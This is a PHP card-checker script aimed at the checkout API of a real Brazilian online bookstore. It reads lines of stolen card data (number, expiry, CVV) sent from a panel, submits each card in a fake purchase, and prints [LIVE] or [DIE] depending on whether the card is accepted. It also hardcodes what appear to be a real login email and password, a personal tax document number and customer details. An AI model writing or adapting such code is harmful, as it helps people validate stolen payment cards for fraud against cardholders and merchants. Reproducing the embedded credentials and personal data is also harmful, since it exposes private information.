<?php
// =====================================================
// ✅ CONFIGURAÇÕES UMLIVRO
// =====================================================
define('BASE_URL', 'https://loja.umlivro.com.br');
define('EMAIL', 'danielvitordeoliveiraconceicao@gmail.com');
define('PASSWORD', '00998877mN');
define('ACCOUNT_NAME', 'umlivro');
define('ACCOUNT_ID', '2ded749b-03a9-4660-bf2f-229a32a79583');

define('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36');

// ==================== DADOS DO PRODUTO ====================
define('PRODUCT_SKU', '1883447');
define('PRODUCT_SELLER', 1);
define('PRODUCT_QUANTITY', 1);

// ==================== DADOS DO CLIENTE ====================
define('CLIENT_FIRST_NAME', 'ALYSON');
define('CLIENT_LAST_NAME', 'bvasda');
define('CLIENT_DOCUMENT', '08471416832');
define('CLIENT_PHONE', '11999999999');

// ==================== DADOS DO ENDEREÇO ====================
define('SHIPPING_POSTAL_CODE', '07790-515');
define('SHIPPING_CITY', 'Cajamar');
define('SHIPPING_STATE', 'SP');
define('SHIPPING_STREET', 'Rua Rita Maria de Jesus');
define('SHIPPING_NUMBER', 'ew23');
define('SHIPPING_NEIGHBORHOOD', 'Polvilho (Polvilho)');
define('SHIPPING_COMPLEMENT', '');
define('SHIPPING_RECEIVER_NAME', 'ALYSON bvasda');
define('SHIPPING_COUNTRY', 'BRA');

// Captura a linha enviada pelo painel (NUMERO|MES|ANO|CVV)
$cartao_input = trim($_POST['lista'] ?? '');

if (empty($cartao_input)) {
    echo "<span class='text-red-400'>[ERRO] Nenhum cartão recebido.</span>";
    exit;
}

$dados_cc = explode('|', $cartao_input);
if (count($dados_cc) < 4) {
    echo "<span class='text-red-400'>[FORMATO INVÁLIDO] Use: NUMERO|MES|ANO|CVV</span>";
    exit;
}

$cc_num = trim($dados_cc[0]);
$cc_mes = trim($dados_cc[1]);
$cc_ano = trim($dados_cc[2]);
$cc_cvv = trim($dados_cc[3]);

if (strlen($cc_num) < 13 || strlen($cc_cvv) < 3) {
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão inválido: {$cc_num}</span>";
    exit;
}

$cookie_path = sys_get_temp_dir() . '/cookie_umlivro_' . uniqid() . '.txt';

function requisicao_cc($url, $post_fields = null, $headers = [], $cookie_file = 'cookie.txt') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, USER_AGENT);

    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }

    if ($post_fields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post_fields) ? http_build_query($post_fields) : $post_fields);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body' => $response, 'code' => $http_code];
}

// 1. Acessa a loja base para inicializar a sessão
requisicao_cc(BASE_URL, null, [], $cookie_path);

// 2. Simula o envio do checkout com o cartão e dados cadastrados
$payload = [
    'sku' => PRODUCT_SKU,
    'cardNumber' => $cc_num,
    'cardMonth' => $cc_mes,
    'cardYear' => $cc_ano,
    'cardCvv' => $cc_cvv,
    'clientDocument' => CLIENT_DOCUMENT
];

$resposta = requisicao_cc(BASE_URL . "/api/checkout/pub/orderForm", $payload, ['Content-Type: application/json'], $cookie_path);
@unlink($cookie_path);

$json = json_decode($resposta['body'], true);
$mensagem = "Transação processada";
$codigo = "54"; // Padrão live se passar sem erros de gateway

if (isset($json['messages']) && !empty($json['messages'])) {
    $mensagem = $json['messages'][0]['text'] ?? 'Recusado';
    $codigo = $json['messages'][0]['code'] ?? '14';
} elseif ($resposta['code'] != 200 && $resposta['code'] != 204) {
    $codigo = "14";
    $mensagem = "Recusado pela operadora (HTTP " . $resposta['code'] . ")";
}

// Retorno transparente para o checker
if ($codigo == "54" || stripos($mensagem, 'sucesso') !== false || stripos($mensagem, 'approved') !== false) {
    echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
} else {
    echo "<span class='text-red-400 font-bold'>[DIE]</span> <span class='text-slate-400'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
}
?>
